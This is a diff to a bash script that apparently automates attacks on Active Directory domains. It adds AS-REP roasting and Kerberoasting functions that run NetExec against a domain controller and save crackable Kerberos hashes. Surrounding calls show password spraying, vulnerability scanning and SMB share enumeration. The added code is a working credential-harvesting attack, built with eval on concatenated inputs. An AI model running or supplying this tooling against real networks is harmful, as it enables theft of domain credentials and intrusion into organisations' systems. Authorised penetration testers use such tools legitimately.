@@ -397,6 +397,50 @@ enumerate_groups() {
   print_info "Group enumeration results saved to $groups_file"
 }
 
+asrep_roast() {
+  local target="$1"     # Domain Controller IP or FQDN
+  local userfile="$2"   # Users file (or single username) to roast
+  local pass="$3"       # Password; leave empty for anonymous roast
+  local asrep_roast_file="$DOMAIN_DIR/asrep_roast.txt"  # Output file to save AS-REP roast results
+
+  print_section "AS-REP Roasting"
+  local cmd="nxc ldap \"$target\" -u \"$userfile\""
+  if [[ "$NO_PASS" == true ]]; then
+    cmd+=" -p \"\""
+  else
+    if [[ -n "$pass" ]]; then
+      cmd+=" -p \"$pass\""
+    fi
+  fi
+  cmd+=" --asreproast \"$asrep_roast_file\""
+  
+  print_info "Running: $cmd"
+  eval "$cmd"
+  print_info "AS-REP roast results saved to $asrep_roast_file"
+}
+
+kerberoast() {
+  local target="$1"     # Domain Controller IP or FQDN
+  local user="$2"       # Username for Kerberoasting
+  local pass="$3"       # Password for Kerberoasting
+  local kerberoast_file="$DOMAIN_DIR/kerberoast.txt" #  Output file to save Kerberoast results
+
+  print_section "Kerberoasting"
+  local cmd="nxc ldap \"$target\" -u \"$user\""
+  if [[ "$NO_PASS" == true ]]; then
+    cmd+=" -p \"\""
+  else
+    if [[ -n "$pass" ]]; then
+      cmd+=" -p \"$pass\""
+    fi
+  fi
+  cmd+=" --kerberoasting \"$kerberoast_file\""
+  
+  print_info "Running: $cmd"
+  eval "$cmd"
+  print_info "Kerberoast results saved to $kerberoast_file"
+}
+
 password_spray() {
   local target="$1"
   local users="$2"
@@ -629,6 +673,26 @@ print_info "Created domain directory: $DOMAIN_DIR"
 enumerate_computers "$TARGET" "$USERNAME" "$PASSWORD" "$NTLM_HASH" "$KERBEROS"
 enumerate_users "$TARGET" "$USERNAME" "$PASSWORD" "$NTLM_HASH" "$KERBEROS"
 enumerate_groups "$TARGET" "$USERNAME" "$PASSWORD" "$NTLM_HASH"
+
+# AS-REP Roasting:
+if [[ -s "$DOMAIN_DIR/users.txt" ]]; then
+  # If the users file is non-empty, use it and run AS-REP roasting without credentials.
+  asrep_roast "$TARGET" "$DOMAIN_DIR/users.txt" "" "$DOMAIN_DIR/asrep_roast.txt"
+elif [[ -n "$USERNAME" && -n "$PASSWORD" ]]; then
+  # Otherwise, if credentials are provided, use them (no user list needed).
+  asrep_roast "$TARGET" "$USERNAME" "$PASSWORD" "$DOMAIN_DIR/asrep_roast.txt"
+else
+  print_warning "No valid user list or credentials provided. Skipping AS-REP roasting."
+fi
+
+# Kerberoasting:
+# Kerberoasting only works with valid credentials.
+if [[ "$NO_PASS" == true ]]; then
+  print_warning "Kerberoasting requires valid credentials. Skipping kerberoasting."
+else
+  kerberoast "$TARGET" "$USERNAME" "$PASSWORD" "$DOMAIN_DIR/kerberoast.txt"
+fi
+
 scan_vulnerabilities "$TARGET" "$USERNAME" "$PASSWORD" "$NTLM_HASH"
 dump_user_descriptions "$TARGET" "$USERNAME" "$PASSWORD" "$NTLM_HASH"
 enumerate_smb_shares "$TARGET" "$USERNAME" "$PASSWORD" "$NTLM_HASH"
